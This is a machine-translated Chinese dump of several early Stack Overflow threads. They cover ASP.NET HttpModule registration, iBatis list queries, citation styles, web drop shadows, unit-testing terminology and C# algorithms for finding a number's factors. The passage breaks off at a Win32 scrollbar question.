意识到这是一个老问题，但是 asp.net 4 提供了一些新的功能可以帮助解决这个问题。

具体来说，ASP.NET 4 提供了一种`PreApplicationStartMethod`可用于以编程方式添加 HttpModules 的功能。

我刚刚在[http://www.nikhilk.net/Config-Free-HttpModule-Registration.aspx](https://web.archive.org/web/20120719043729/http://www.nikhilk.net/Config-Free-HttpModule-Registration.aspx)上发表了一篇博文。

基本思想是创建一个派生类，它提供在启动时动态添加 HttpModules 的能力，然后每当在应用程序域中创建`HttpApplication`每个实例时，它都会将它们初始化到管道中。`HttpApplication`

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2010-11-26T13:52:31.163

dll Microsoft.Web.Infrastructure.dll 在类 DynamicModuleUtility 中有一个方法。该 dll 随 WebPages 1.0 一起提供

```
public static class PreApplicationStartCode
{
    private static bool _startWasCalled;

    public static void Start()
    {
        if (_startWasCalled) return;

        _startWasCalled = true;
        DynamicModuleUtility.RegisterModule(typeof(EventTriggeringHttpModule));
    }
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2019-01-08T18:54:32.887

这对我来说适用于动态注册。

```
RegisterModule(typeof(RequestLoggerModule));

public class RequestLoggerModule : IHttpModule
    { ... } 
```

[https://docs.microsoft.com/en-us/dotnet/api/system.web.httpapplication.registermodule?view=netframework-4.7.2](https://docs.microsoft.com/en-us/dotnet/api/system.web.httpapplication.registermodule?view=netframework-4.7.2)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-12-09T10:48:57.603

在新版本的 ASP MVC 中，您可以使用包管理器添加对 WebActivatorX 的引用，然后执行类似这样的操作

```
using WhateverNameSpacesYouNeed;

[assembly: WebActivatorEx.PreApplicationStartMethod(typeof(YourApp.SomeNameSpace.YourClass), "Initialize")]
namespace YourApp.SomeNameSpace
{
  public static void Initialize()
  {
    DynamicModuleUtility.RegisterModule( ... the type that implements IHttpModule ... );
  }
} 
```

# java - 如何在 Ibatis 中使用 SqlMap 映射多条记录

> ID：239812
> 
> 赞同：4
> 
> 时间：2008-10-27T13:02:01.870
> 
> 标签：java, ibatis

我只是第一次使用 SqlMap 进入 ibatis，我遇到了一个问题。我已经弄清楚如何插入、删除、更新和选择单个记录。但是，现在我正在尝试编写一个 select 语句，它将带回不止一条记录，并且我遇到了映射错误。如何指定结果应该是我的自定义对象的列表？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-27T13:51:37.540

我已经想通了。使用 java 我只需要使用 queryForList 函数而不是 queryForObject。

# documentation - 计算机科学/软件工程领域是否有标准化的引文格式？

> ID：239813
> 
> 赞同：4
> 
> 时间：2008-10-27T13:02:19.933
> 
> 标签：documentation, report, citations

Wikipedia 提供[了许多在科学中使用的引文](http://en.wikipedia.org/wiki/Citation#Sciences)，但是在计算机科学和软件工程相关文档中是否有一个突出？我最初的猜测是[IEEE 格式](http://www.computer.org/portal/site/ieeecs/menuitem.c5efb9b8ade9096b8a9ca0108bcd45f3/index.jsp?&pName=ieeecs_level1&path=ieeecs/publications/author/style&file=refer.xml&xsl=generic.xsl&;jsessionid=JF8Gz8vgnLvVvyJLfxFnpyWfbT7QT4fZy1GhHBd913hGq2qHsJ2K!-478330902)，因为他们有许多与这两个领域相关的会议和出版物，但我找不到任何确定的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T13:11:33.300

我想我在不同的地方同时使用了 APA 和 MLA 风格。与新闻或心理学不同，没有明确的标准，因此它可能主要取决于您拥有的学校/教授。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T13:05:14.797

通常在 Com Sci 的大学里，你至少会使用我在美国找到的 MLA 引用标准。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T13:06:42.187

您通常会看到美国大学计算机科学系使用的[APA 风格](http://en.wikipedia.org/wiki/APA_style)或[MLA 风格的引文。](http://en.wikipedia.org/wiki/MLA_style)MLA 在过去被更广泛地使用，因为它已在新闻业中使用多年，但 APA 在学术界（不仅在 CS，而且在许多领域）正在取得进展。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T13:28:32.063

无论 LaTeX 碰巧生成什么。由于没有标准，我选择最方便的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-27T14:03:50.560

当我在纸上写东西时，我总是使用 APA 风格，但我更喜欢的形式是超链接。毕竟这是 CS :)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-27T14:24:11.673

遵循您计划提交的出版物的标准。所有会议和期刊都应该在提交过程中提供可用的格式信息，并且通常甚至会提供您可以处理的 LaTeX 存根。

如果你只是为一门课写论文，请咨询你的教授是否有他们喜欢的出版物格式样式，如果他们没有，请随意从你可以掌握的存根中挑选自己的.

这里最大的收获是，如果你担心测量边距和放置逗号，你要么重新发明轮子，不使用 LaTeX，或者可能两者兼而有之，如果你认真参与 CS 的学术方面，那就是你应该尽快学习的东西。

* * *

## 回答 #7

> 赞同：-3
> 
> 时间：2017-04-11T18:41:37.847

我想我在这个线程上有点晚了。但我只是要分享一些资源，以防有人在这里绊倒。他们确实有标准化的引文格式。事实上，格式可能因机构而异。如果您的机构有不同的格式，您可以随时使用[ieee citation machine](http://www.researchomatic.com/ieee-citation-generator/)。它们帮助您自动生成引文。

# javascript - 应用投影的最佳方法是什么？

> ID：239816
> 
> 赞同：3
> 
> 时间：2008-10-27T13:04:14.720
> 
> 标签：javascript, jquery, css, animation, user-interface

应用阴影的最佳方法是什么？我现在正在一个网站上工作，我们有很多这样的网站，但是，我一直在努力寻找最好的方法来做到这一点。该网站的动画非常繁重，因此阴影需要很好地处理这个问题。

我尝试了一个 jQuery 阴影插件。阴影看起来不错并且易于使用，但速度很慢并且不适用于任何动画（需要大量重绘，非常缓慢）。

我还尝试创建自己的 jQuery 扩展，将我的元素包装在几个灰色 div 中，然后稍微偏移它们以产生阴影效果。这运作良好。它快速响应动画。然而，它使 DOM 操作/遍历变得很麻烦，因为所有内容都包含在这些影子 div 中。

我知道必须有更好的方法，但这并不是我的强项。想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T13:29:51.470

[ShadedBorder](http://www.ruzee.com/blog/shadedborder/)是一个外观漂亮且易于使用的 Shadow-Library。看看这个

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T14:50:55.237

您不需要将这些 shadow-div 包裹在其他内容周围，只需将它们稍微倾斜并将它们放在较低的 z-index 上！-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T13:30:28.380

如果您的主要问题是导航 DOM，只需向您的元素添加一个类和/或 id，并使用 JQuery 选择器引用它。如果您将 ref 存储在变量中会更好，因此您不需要过于频繁地选择它

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-29T12:11:54.887

虽然它还没有完全的跨浏览器支持，但您可能想尝试使用[CSS 3 text-shadow 属性](http://reference.sitepoint.com/css/text-shadow)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-11-04T19:41:26.423

这在很大程度上取决于您的图像需要更改的频率以及它们将覆盖的彩色区域。因为我猜您需要注意 IE6 合规性，所以大多数 alpha-PNG 解决方案会导致如此可怕的抖动，以至于您在性能优化上花费的时间比您想猜测的要多。

过去为了解决这个问题，由于我们的图像每月修改不到一次，我们通过缓存 PHP 脚本调用图像，该脚本使用预定义的背景颜色自动应用阴影，因此我们不必依赖任何透明度。这导致更快的下载（更少的 HTTP 请求）和更快的界面，因为工作中的 Javascript/CSS 魔法更少。

我知道这是一个非常老派的解决方案，如果您的图像是静态的，上述解决方案将完全可以接受，但是跨浏览器兼容和动画可能会迫使您做这种风格的解决方案。

# html - 图像拉伸和调整大小

> ID：239819
> 
> 赞同：2
> 
> 时间：2008-10-27T13:05:50.770
> 
> 标签：html, .net, image, image-manipulation

我有一张图片需要调整到特定尺寸，然后将其中一个角移动到比以前更高的位置，这样图像就不再是矩形，而是某种多边形。是否有一个库可以帮助我进行这种图像处理，或者有人知道这个操作的名称吗？

这适用于 .NET 应用程序，还有一个六点区域的选项。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-27T13:14:46.413

看看[这里](http://vckicks.110mb.com/image-distortion.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T13:57:21.977

[Anti-Grain Geometry](http://www.antigrain.com/)是一个有趣的图形库。还有一个名为[CreativeDocs.NET](http://www.creativedocs.net/devs/agg)的 .NET 包装器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T13:07:13.370

我不知道它是否有帮助，但你可能想看看 CxImage：

[http://www.xdp.it/cximage.htm](http://www.xdp.it/cximage.htm)

# .net - ASP.NET HttpApplication.EndRequest 事件未触发

> ID：239823
> 
> 赞同：8
> 
> 时间：2008-10-27T13:07:50.907
> 
> 标签：.net, asp.net

根据[此 MSDN 文章](http://msdn.microsoft.com/en-us/library/y3bwdsh3.aspx) *HttpApplication* .EndRequest 可用于关闭或处置资源。但是，在我的应用程序中不会触发/调用此事件。

我们通过以下方式在 Page_Load 中附加处理程序：

```
HttpContext.Current.ApplicationInstance.EndRequest += ApplicationInstance_EndRequest; 
```

唯一的方法是使用 Global.asax 中的 Application_EndRequest 处理程序，但这对我们来说是不可接受的。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-10-27T15:02:35.370

如果您不想使用 global.asax，可以使用自己的 HttpModule 来捕获 EndRequest。

```
public class CustomModule : IHttpModule 
{
    public void Init(HttpApplication context)
    {
        context.EndRequest += new EventHandler(context_EndRequest);
    }

    private void context_EndRequest(object sender, EventArgs e)
    {
        HttpContext context = ((HttpApplication)sender).Context;
        // use your contect here
    }
} 
```

您需要将该模块添加到您的 web.config

```
<httpModules>
    <add name="CustomModule" type="CustomModule"/>
</httpModules> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-27T14:08:12.780

根据 MSDN 文档，此事件在页面完成后发生，就像 BeginRequest 一样。因此，据我所知，不可能在页面级别捕捉到这一点

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2011-01-29T01:48:39.900

我相信链接此事件的更好方法是为 global.asax 提供一个基类

```
Language="C#" Inherits="YourBaseClass" 
```

然后覆盖 Init()：

```
public override void Init()
{
    base.Init();

    BeginRequest += new EventHandler(OnBeginRequest);
    EndRequest += new EventHandler(OnEndRequest);
} 
```

似乎对我有用（捕获断点），但我真的在用它做任何事情。

由于存在多个 HttpApplication 实例，因此在 Page_load 中设置它可能会不断将其添加到非特定实例中。奇怪的是，我还注意到第一个 HttpApplication 实例（但 Application_start）不会调用 HttpApplication.Init()。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T13:19:58.993

该页面可能在事件触发之前被释放。您可能想尝试在 Page_Unload 处理程序中完成您的工作。

# c# - VirtualPc 中的进程与主机上的进程对话的最佳方式是什么？

> ID：239827
> 
> 赞同：0
> 
> 时间：2008-10-27T13:10:23.147
> 
> 标签：c#, virtual-pc

我有 Virtual PC 2007。我正在编写一个将在主机和虚拟机上运行的 C# 程序。它需要双向沟通。

**做这个的最好方式是什么？**

**可以以不需要更改虚拟设置的方式完成吗？**

（操作系统将是 XP、Vista、Server 2000 / 2003）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-27T13:11:39.243

通过 TCP。简单的客户端/服务器设置。

或者

[.NET 远程处理](http://msdn.microsoft.com/en-us/library/ms973864.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-27T13:13:57.243

[周转基金](http://msdn.microsoft.com/en-us/netframework/aa663324.aspx)。.NET Remoting，无需拨打预防自杀热线电话。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T13:25:02.540

WCF绝对是要走的路。是否需要更改虚拟设置取决于您的虚拟机的设置方式。

最安全的方法是创建一个只有主机和访客可以访问的新专用网络。这样您就不必担心更改主网络接口上的任何防火墙设置以允许服务器和客户端进行通信。

OTOH，如果安全不是问题，那么访客的标准桥接网络选项将正常工作。

# language-agnostic - 如何在语言之间共享配置信息或业务规则

> ID：239832
> 
> 赞同：8
> 
> 时间：2008-10-27T13:11:45.687
> 
> 标签：language-agnostic, configuration, dry, business-rules

我正在寻找在不同地方使用相同数据而不[重复自己](http://en.wikipedia.org/wiki/Don%27t_repeat_yourself)的最佳实践——这可能包括配置或业务规则。

示例 1\. 您希望在客户端使用 javascript 进行验证的数据验证规则，但您希望通过在服务器上进行验证来确保。

示例 2\. 您的 Web 服务器和您的 cronjobs 使用相同的密码、用户名的数据库访问。

易于处理和人类可读的解决方案将是一个优势。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-27T13:14:54.120

[在JSON](http://www.json.org/)中编码您的数据。几乎所有您想想到的语言都有一个 JSON 库，或者如果没有，编写一个非常容易。如果 JSON 还不够，也许看看[YAML](http://www.yaml.org/)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-27T13:18:29.260

XML 在全球范围内被广泛使用。易读、易写、易读。如果您担心空间开销（如果您想要人类可读，您实际上并不担心）然后在发送之前压缩它，XML 压缩得很好。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-27T13:21:09.193

[请参阅此问题](https://stackoverflow.com/questions/113696/how-not-to-repeat-yourself-across-projects-andor-languages)的答案。我认为它们在这里适用，尤其[是带有 DSL 的那个](https://stackoverflow.com/questions/113696/how-not-to-repeat-yourself-across-projects-andor-languages#113709)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T14:05:46.263

尽管他们讨厌，但对于共享数据验证规则，我不得不说[正则表达式](http://www.regular-expressions.info/)。

我知道，我知道，每个人都讨厌他们，但他们（通常）与语言无关。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-12-01T19:41:35.673

1.  使用 O/S 环境变量 (envvars) 来存储应用程序配置信息（例如 db 密码）

2.  验证规则通常需要逻辑。您可以用 JavaScript 编写规则，然后在浏览器、服务器（使用 Nashorn）和数据库（带有 Postgres 的 PLV8）中运行它们。

# unit-testing - 什么是“单位”？

> ID：239863
> 
> 赞同：14
> 
> 时间：2008-10-27T13:28:37.620
> 
> 标签：unit-testing, language-agnostic

在单元测试的上下文中，什么是“单元”？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-10-27T13:34:40.650

我通常将其定义为通过单一方法的**单一代码执行路径。**这来自经验法则，即测试方法所需的单元测试数量等于或大于方法的[圈复杂度数](http://en.wikipedia.org/wiki/Cyclomatic_complexity)。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-10-27T13:33:03.023

虽然定义可能会有所不同，但“单元”是一段独立的代码。

通常，它是一个单独的类。

但是，很少有类是孤立存在的。因此，您经常必须模拟与您的测试类协作的类。

因此，“单元”（也称为“夹具”）是一个可测试的东西——通常是一个类加上协作者的模型。

您可以使用单元测试技术轻松测试相关类的包。我们一直这样做。这些固定装置中很少或没有模拟。

事实上，您可以将整个独立应用程序作为单个“单元”进行测试。我们也这样做。提供一组固定的输入和输出，以确保整个应用程序正确执行操作。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-10-27T13:34:49.820

单元是可以单独测试的任何元素。因此，几乎总是在 OO 环境中测试方法，以及在该类的方法之间存在紧密耦合的某些类行为。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-01T04:01:00.580

以我的经验，关于“什么是单位”的辩论是浪费时间。

更重要的是“测试有多快？” 快速测试以 100+/秒的速度运行。慢速测试运行得足够慢，以至于您不会在每次停下来思考时都反射性地运行它们。

如果您的测试很慢，您将不会频繁地运行它们，从而使错误注入和错误检测之间的时间变长。

如果您的测试很慢，您可能无法获得单元测试的设计优势。

想要快速测试？遵循 Michael Feather 的[单元测试规则](http://www.artima.com/weblogs/viewpost.jsp?thread=126923)。

但是，如果您的测试很快并且它们正在帮助您编写代码，那么谁在乎它们有什么标签呢？

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-27T13:30:24.480

我们将“单元”定义为单个类。

正如您正确断言的那样，“单元”是一个模棱两可的术语，当开发人员仅使用该表达式而不添加细节时，这会导致混淆。在我工作的地方，当我们说“单元测试”、“验收测试”等时，我们会花时间定义我们的意思。当有人新加入团队时，他们会了解我们的定义。

从实际的角度来看，对于“单位”是什么，可能总是会有不同的意见。我发现重要的是该术语在项目上下文中的*使用始终如一。*

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-01T00:53:26.310

如果我工作一个“单位”是一个功能。那是因为我们不允许在我们的设计中使用除功能分解之外的任何东西（没有 OOP）。我 100% 同意威尔的回答。至少这是我在引擎和飞行控制以及各种其他系统的嵌入式编程工作范式中的答案。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-27T13:32:39.310

可以是不同的东西。一个类、一个模块、一个文件……选择您想要的测试粒度。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-27T13:38:18.130

我会说一个单元是一个可以在应用程序中使用的“黑匣子”。它具有已知接口并提供明确定义的结果。这是必须根据设计规范工作并且必须是可测试的。

话虽如此，在这种“黑匣子”中构建项目时，我经常使用单元测试作为开发辅助。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-27T14:07:31.860

我会说单元测试中的一个单元是一个类的*单一责任*。

当然，这种观点来自于我们的工作方式：

在我的团队中，我们使用术语单元测试来测试单个类的职责。我们使用模拟对象来覆盖所有其他对象，以便类的职责真正隔离，并且如果其他对象有错误，则不会受到影响。

我们使用术语集成测试来测试两个或多个类如何一起运行，以便我们看到实际功能在那里。

最后，我们帮助我们的客户编写验收测试，这些测试作为一个整体对应用程序进行操作，以了解当“用户”使用应用程序时实际发生了什么。

这就是让我认为这是一个很好的描述的原因。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-12-01T04:09:26.510

我的理解（或基本原理）是单元应该遵循类似于代码的层次分解的抽象层次和范围。

方法是低抽象级别的小型且通常是原子（概念上）操作，因此应该对其进行测试

类是提供服务和状态的中级概念，因此应该进行测试。

整个模块（特别是如果它的组件是隐藏的）是一个具有有限接口的高级概念，因此应该对其进行测试等。

由于许多错误是由多个方法和类之间的交互引起的，所以我看不到仅对单个方法进行单元测试可以实现覆盖率，直到您已经有了利用每个重要组合的方法，但这表明您没有测试在编写客户端代码之前就足够了。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-12-01T07:25:04.693

**那不重要**。当然，您要求开始进行单元测试是正常的，但我再说一遍，这并不重要。

该单位类似于：

*   测试调用的方法。在 OOP 中，必须在类的实例上调用此方法（静态方法除外）
*   过程语言中的一个函数。

**But**, the "unit", function or method, may also invoke another "unit" from the application, which is likewise exercised by the test. So the "unit" can span over several functions or even several classes.

"The test is more important than the unit" ([testivus](http://www.testdriven.com/modules/news/article.php?storyid=556)). A good test shall be :

*   Automatic - execution and diagnostic
*   Fast - you'll run them very often
*   Atomic - a test shall test only one thing
*   Isolated - tests shall not depend on each other
*   Repeatable - result shall be deterministic

# c# - 查找给定数字的所有因子的最佳方法

> ID：239865
> 
> 赞同：34
> 
> 时间：2008-10-27T13:28:52.440
> 
> 标签：c#, .net, math

所有能除以 x 的数。

我输入 4 它返回： 4, 2, 1

编辑：我知道这听起来很家庭作业。我正在编写一个小应用程序来用半随机测试数据填充一些产品表。其中两个属性是 ItemMaximum 和 Item Multiplier。我需要确保乘数不会造成不合逻辑的情况，即再购买 1 件商品会使订单超过允许的最大值。因此，这些因素将为我的测试数据提供有效值列表。

编辑++：在大家的帮助下，这就是我所做的。再次感谢！

编辑#：我写了 3 个不同的版本来看看我更喜欢哪个版本，并针对分解小数字和非常大的数字对它们进行了测试。我将粘贴结果。

```
static IEnumerable<int> GetFactors2(int n)
{
    return from a in Enumerable.Range(1, n)
                  where n % a == 0
                  select a;                      
}

private IEnumerable<int> GetFactors3(int x)
{            
    for (int factor = 1; factor * factor <= x; factor++)
    {
        if (x % factor == 0)
        {
            yield return factor;
            if (factor * factor != x)
                yield return x / factor;
        }
    }
}

private IEnumerable<int> GetFactors1(int x)
{
    int max = (int)Math.Ceiling(Math.Sqrt(x));
    for (int factor = 1; factor < max; factor++)
    {
        if(x % factor == 0)
        {
            yield return factor;
            if(factor != max)
                yield return x / factor;
        }
    }
} 
```

在滴答声中。当分解数字 20 时，每个 5 次：

*   GetFactors1-5,445,881
*   GetFactors2-4,308,234
*   获取因子 3-2,913,659

当分解数字 20000 时，每个 5 次：

*   GetFactors1-5,644,457
*   GetFactors2-12,117,938
*   GetFactors3-3,108,182

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2008-10-27T13:32:39.060

伪代码：

*   从 1 循环到数字的平方根，称为索引“i”。
*   如果 number mod i 为 0，则将 i 和 number / i 添加到因子列表中。

重新编码：

```
public List<int> Factor(int number) 
{
    var factors = new List<int>();
    int max = (int)Math.Sqrt(number);  // Round down

    for (int factor = 1; factor <= max; ++factor) // Test from 1 to the square root, or the int below it, inclusive.
    {  
        if (number % factor == 0) 
        {
            factors.Add(factor);
            if (factor != number/factor) // Don't add the square root twice!  Thanks Jon
                factors.Add(number/factor);
        }
    }
    return factors;
} 
```

正如 Jon Skeet 所提到的，您也可以将其实现`IEnumerable<int>`为 - 使用[yield](http://msdn.microsoft.com/en-us/library/9k7k7cf0(VS.80).aspx)而不是添加到列表中。这样做的好处`List<int>`是，如果需要，它可以在返回之前进行排序。再说一次，您可以使用混合方法获得一个排序的枚举器，产生第一个因子并在循环的每次迭代中存储第二个因子，然后产生以相反顺序存储的每个值。

您还需要做一些事情来处理将负数传递给函数的情况。

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2008-10-27T13:34:14.470

`%`（余数）运算符是此处使用的运算符。如果`x % y == 0`then`x`能被 整除`y`。（假设`0 < y <= x`）

我个人将其实现为返回`IEnumerable<int>`使用迭代器块的方法。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2010-08-08T05:41:35.747

很晚了，但接受的答案（不久前）没有给出正确的结果。

多亏了 Merlyn，我现在得到了平方的原因，因为它是校正样本下方的“最大值”。尽管Echostorm的答案似乎更完整。

```
public static IEnumerable<uint> GetFactors(uint x)
{
    for (uint i = 1; i * i <= x; i++)
    {
        if (x % i == 0)
        {
            yield return i;
            if (i != x / i)
                yield return x / i;
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-27T13:39:44.663

作为扩展方法：

```
 public static bool Divides(this int potentialFactor, int i)
    {
        return i % potentialFactor == 0;
    }

    public static IEnumerable<int> Factors(this int i)
    {
        return from potentialFactor in Enumerable.Range(1, i)
               where potentialFactor.Divides(i)
               select potentialFactor;
    } 
```

这是一个使用示例：

```
 foreach (int i in 4.Factors())
        {
            Console.WriteLine(i);
        } 
```

请注意，我已经优化了清晰度，而不是性能。对于较大的值，`i`此算法可能需要很长时间。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-27T14:35:25.033

另一种 LINQ 风格和保持 O(sqrt(n)) 复杂性的方法

```
 static IEnumerable<int> GetFactors(int n)
        {
            Debug.Assert(n >= 1);
            var pairList = from i in Enumerable.Range(1, (int)(Math.Round(Math.Sqrt(n) + 1)))
                    where n % i == 0
                    select new { A = i, B = n / i };

            foreach(var pair in pairList)
            {
                yield return pair.A;
                yield return pair.B;
            }

        } 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-27T13:47:46.083

正如其他人所提到的，这又是一次，只计算平方根。如果您希望提高性能，我想人们会被这个想法所吸引。我宁愿先写优雅的代码，然后在测试我的软件后优化性能。

不过，作为参考，这里是：

```
 public static bool Divides(this int potentialFactor, int i)
    {
        return i % potentialFactor == 0;
    }

    public static IEnumerable<int> Factors(this int i)
    {
        foreach (int result in from potentialFactor in Enumerable.Range(1, (int)Math.Sqrt(i))
                               where potentialFactor.Divides(i)
                               select potentialFactor)
        {
            yield return result;
            if (i / result != result)
            {
                yield return i / result;
            }
        }
    } 
```

不仅结果的可读性大大降低，而且这些因素也以这种方式出现混​​乱。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-04-24T22:49:04.320

我用懒惰的方式做到了。我知道的不多，但有人告诉我，简单有时也意味着优雅。这是一种可能的方法：

```
 public static IEnumerable<int> GetDivisors(int number)
    {
        var searched = Enumerable.Range(1, number)
             .Where((x) =>  number % x == 0)
             .Select(x => number / x);

        foreach (var s in searched)          
            yield return s;
    } 
```

**编辑**：正如 Kraang Prime 指出的，这个函数不能超过整数的限制，并且（诚然）不是处理这个问题的最有效方法。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-27T14:01:32.903

从 2 开始并朝着根据您刚刚检查的数字不断重新计算的上限值前进不是也有意义吗？请参阅 N/i（其中 N 是您要查找的因数，i 是要检查的当前数字...）理想情况下，您可以使用一个除法函数而不是 mod，它也返回 N/i就像它可能有的任何剩余部分一样。这样，您将执行一个除法操作来重新创建您的上限以及您将检查偶数除法的余数。

Math.DivRem [http://msdn.microsoft.com/en-us/library/wwc1t3y1.aspx](http://msdn.microsoft.com/en-us/library/wwc1t3y1.aspx)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2014-08-13T12:12:26.253

如果您使用双打，以下工作：使用从 1 到您想要分解的数字的 for 循环。在每次迭代中，将要分解的数字除以 i。如果 (number / i) % 1 == 0，则 i 是一个因数，number / i 的商也是如此。将其中一个或两个放在一个列表中，你就拥有了所有的因素。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2018-08-17T13:24:06.887

还有一种解决方案。不知道它除了可读性之外是否还有其他优点..：

```
List<int> GetFactors(int n)
{
    var f = new List<int>() { 1 };  // adding trivial factor, optional
    int m = n;
    int i = 2;
    while (m > 1)
    {
        if (m % i == 0)
        {
            f.Add(i);
            m /= i;
        }
        else i++;
    }
    // f.Add(n);   // adding trivial factor, optional
    return f;
} 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2022-02-24T01:02:14.443

我来这里只是为自己寻找解决此问题的方法。在检查了之前的回复之后，我认为即使我参加聚会可能会迟到一点，也可以自己给出一个答案。一个数的最大因子数将不超过该数的一半。无需处理浮点值或平方根之类的超越运算。此外，找到一个数的一个因数会自动找到另一个因数。只需找到一个，您只需将原始数字除以找到的数字即可返回两者。

我怀疑我是否需要对自己的实现使用检查，但我将它们包括在内只是为了完整性（至少部分如此）。

```
public static IEnumerable<int>Factors(int Num)
{
  int ToFactor = Num;

  if(ToFactor == 0)
  { // Zero has only itself and one as factors but this can't be discovered through division
    // obviously. 
     yield return 0;
     return 1;
  }

  if(ToFactor < 0)
  {// Negative numbers are simply being treated here as just adding -1 to the list of possible 
   // factors. In practice it can be argued that the factors of a number can be both positive 
   // and negative, i.e. 4 factors into the following pairings of factors:
   // (-4, -1), (-2, -2), (1, 4), (2, 2) but normally when you factor numbers you are only 
   // asking for the positive factors. By adding a -1 to the list it allows flagging the
   // series as originating with a negative value and the implementer can use that
   // information as needed.
    ToFactor = -ToFactor;

    yield return -1;
   }

  int FactorLimit = ToFactor / 2; // A good compiler may do this optimization already.
                                  // It's here just in case;

  for(int PossibleFactor = 1; PossibleFactor <= FactorLimit; PossibleFactor++)
  {
    if(ToFactor % PossibleFactor == 0)
    {
      yield return PossibleFactor;
      yield return ToFactor / PossibleFactor;
    }
  }
} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2019-03-07T07:39:39.347

在 javascript 代码中获取整数的素数的程序。

```
function getFactors(num1){
    var factors = [];
    var divider = 2;
    while(num1 != 1){
        if(num1 % divider == 0){
            num1 = num1 / divider;
            factors.push(divider);
        }
        else{
            divider++;
        }
    }
    console.log(factors);
    return factors;
}

getFactors(20); 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2021-09-25T06:47:05.143

事实上，我们不必从[chris](https://stackoverflow.com/a/239877/9882771)提出的接受的答案中检查每次迭代中不是[平方根](https://stackoverflow.com/users/22656/jon-skeet)的因素，这可能会在整数很大时通过添加不必要的布尔检查和除法来减慢该方法的速度. 只需保持`max`as double （不要将其转换为 an `int`）并更改为 loop 以排除不包含。

```
 private static List<int> Factor(int number)
    {
        var factors = new List<int>();
        var max = Math.Sqrt(number);  // (store in double not an int) - Round down
        if (max % 1 == 0)
            factors.Add((int)max);

        for (int factor = 1; factor < max; ++factor) //  (Exclusice) - Test from 1 to the square root, or the int below it, inclusive.
        {
            if (number % factor == 0)
            {
                factors.Add(factor);
                //if (factor != number / factor) // (Don't need check anymore) - Don't add the square root twice!  Thanks Jon
                factors.Add(number / factor);
            }
        }
        return factors;
    } 
```

**用法**

```
Factor(16)
// 4 1 16 2 8
Factor(20)
//1 20 2 10 4 5 
```

这是`int`type 方法的扩展版本：

```
public static class IntExtensions
{
    public static IEnumerable<int> Factors(this int value)
    {
        // Return 2 obvious factors
        yield return 1;
        yield return value;

        // Return square root if number is prefect square
        var max = Math.Sqrt(value);
        if (max % 1 == 0)
            yield return (int)max;

        // Return rest of the factors
        for (int i = 2; i < max; i++)
        {
            if (value % i == 0)
            {
                yield return i;
                yield return value / i;
            }
        }
    }
} 
```

**用法**

```
16.Factors()
// 4 1 16 2 8
20.Factors()
//1 20 2 10 4 5 
```

* * *

## 回答 #14

> 赞同：-2
> 
> 时间：2008-10-27T13:37:13.560

林克解决方案：

```
IEnumerable<int> GetFactors(int n)
{
  Debug.Assert(n >= 1);
  return from i in Enumerable.Range(1, n)
         where n % i == 0
         select i;
} 
```

# winapi - Win32滚动条触底时如何启用按钮？

> ID：239866
> 
> 赞同：2
> 
> 时间：2008-10-27T13:28:56.247
> 
> 标签：winapi, scrollbar

我正在用 Win32 编写一个许可协议对话框，我很困惑。像往常一样，我希望在 Richedit 控件的滚动条的滑块到达底部时启用“接受/不接受”按钮，但我找不到获得该事件通知的方法。我最早能够了解它是当用户释放鼠标左键时。

有没有办法做到这一点？

这是我到目前为止所尝试的：

